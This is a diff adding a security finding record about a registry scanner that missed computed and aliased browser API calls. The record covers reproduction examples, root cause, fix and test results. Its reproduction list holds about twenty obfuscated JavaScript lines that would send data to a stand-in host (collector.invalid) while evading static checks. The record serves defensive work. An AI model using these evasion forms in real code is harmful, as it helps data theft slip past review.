@@ -1,0 +1,60 @@
+{
+  "findingId": "SEC-37-086",
+  "severity": "medium",
+  "title": "Computed and unresolved browser API/DOM member names bypassed registry source isolation",
+  "status": "fixed_locally",
+  "date": "2026-10-21",
+  "reproduction": {
+    "examples": [
+      "window[\"fe\" + \"tch\"]('https://collector.invalid/data');",
+      "const method = 'fetch'; globalThis[method]('https://collector.invalid/data');",
+      "new window[\"Wor\" + \"ker\"]('https://collector.invalid/worker.js');",
+      "new window[\"Fun\" + \"ction\"]('return 1');",
+      "document[\"wri\" + \"te\"]('<img src=https://collector.invalid/pixel>');",
+      "window[\"set\" + \"Timeout\"]('sendSecret()', 0);",
+      "const image = document.createElement('img'); image[\"s\" + \"rc\"] = 'https://collector.invalid/pixel.png';",
+      "const image = document.createElement('img'); const attribute = 'src'; image[attribute] = 'https://collector.invalid/pixel.png';",
+      "const element = document[\"create\" + \"Element\"]('img'); element.src = 'https://collector.invalid/pixel.png';",
+      "const create = document.createElement; const element = create('img'); element.src = 'https://collector.invalid/pixel.png';",
+      "const create = document[\"createElement\"]; const element = create('img'); element.src = 'https://collector.invalid/pixel.png';",
+      "const request = window[enabled ? 'fetch' : 'clearTimeout']; request('https://collector.invalid/data');",
+      "const image = document.createElement('img'); image[enabled ? 'src' : 'alt'] = 'https://collector.invalid/pixel.png';",
+      "const api = window[getApiName()]; api('https://collector.invalid/data');",
+      "const element = document.createElement('img'); element[getAttributeName()] = 'https://collector.invalid/pixel.png';",
+      "window[getApiName()]('https://collector.invalid/data');",
+      "const constructor = window[getApiName()]; new constructor('https://collector.invalid/worker.js');",
+      "const element = document.createElement('img'); element[getMethodName()]('src', 'https://collector.invalid/pixel.png');",
+      "Reflect.get(window, getApiName())('https://collector.invalid/data');",
+      "const api = Reflect.get(window, getApiName()); api('https://collector.invalid/data');",
+      "Reflect.apply(Reflect.get(window, getApiName()), window, ['https://collector.invalid/data']);",
+      "Object.getOwnPropertyDescriptor(window, getApiName())?.value('https://collector.invalid/data');"
+    ],
+    "beforeFix": "The AST gate accepted statically and dynamically computed member names on browser globals, computed element assignments, and remote src writes on elements created through computed or aliased document.createElement references. The regression first failed with a concatenated fetch property returning pass, then multi-outcome, neutral-name DOM, and unresolved dynamic API cases also returned pass. Reflected lookups through Reflect.get and Object.getOwnPropertyDescriptor also returned pass when their property name was unresolved at compile time.",
+    "afterFix": "The scanner resolves literal concatenation, const-bound property names, and constant conditional alternatives; it rejects unresolved computed API invocations and risky resource assignments when their receiver is a browser global or a known DOM element. It follows computed/aliased document.createElement references when identifying resource elements. Unresolved reflected lookups and descriptor values that target browser globals also fail closed when invoked."
+  },
+  "rootCause": "The shared static-member resolver only recognized dot properties and direct string-literal element access, ignored unresolved computed browser/DOM invocations, and resource-element inference only followed direct document.createElement calls. Network, dynamic-code, worker, markup, timer and DOM-assignment checks therefore missed computed access forms and aliased DOM factories. Reflection helpers handled only statically resolved property strings and silently ignored unresolved Reflect.get/Object descriptor results used as callable API references.",
+  "affectedFiles": [
+    "packages/registry-gate/src/checks/isolation-check.ts",
+    "packages/registry-gate/src/__tests__/registry-gate.test.ts"
+  ],
+  "remediation": "Resolve safe compile-time strings for computed member access, preserve sensitive candidates from compile-time conditionals, fail closed on unresolved computed browser/DOM API invocations and risky assignments, follow statically aliased document.createElement functions, and use the same member representation when checking computed assignments. Apply the unresolved-call check to Reflect.get and Object.getOwnPropertyDescriptor result values as well.",
+  "validation": {
+    "redBeforeFix": [
+      "pnpm test -- packages/registry-gate/src/__tests__/registry-gate.test.ts",
+      "Failed as expected: a concatenated window.fetch lookup returned pass.",
+      "Failed as expected: a conditional fetch candidate returned pass.",
+      "Failed as expected: a remote src write through a neutral element alias returned pass.",
+      "Failed as expected: remote src writes through computed and aliased document.createElement references returned pass with a neutral element variable name.",
+      "Failed as expected: an unresolved computed window API alias returned pass.",
+      "Failed as expected: unresolved Reflect.get and Object.getOwnPropertyDescriptor API lookups returned pass."
+    ],
+    "targetedAfterFix": "54 registry-gate tests passed, including twenty-two computed, reflected, dynamic-member, and DOM-factory sink forms.",
+    "fullUnitSuite": "1,179 tests passed across 76 files; the Gold-artifact filesystem test passed after a standalone rerun.",
+    "typecheck": "22 workspace packages passed.",
+    "lint": "0 errors and 33 existing warnings; changed registry files and matrix script have zero warnings.",
+    "releaseAudit": "All 16 behavioral gates, production builds, bundle budgets, provenance/security audits, and dependency audit passed after the reflected lookup fix.",
+    "canonicalResourceIsolationMatrix": "Repeatable command: pnpm exec tsx quality/scripts/audit-registry-source-isolation.ts; 324 resources scanned, 324 passed, zero warnings, zero failures.",
+    "untrustedCodeExecuted": false
+  },
+  "runtimeBoundary": "This finding covers the local static registry source gate. It does not replace deployed app-shell CSP, preview sandbox or gateway verification; public release verification remains pending."
+}
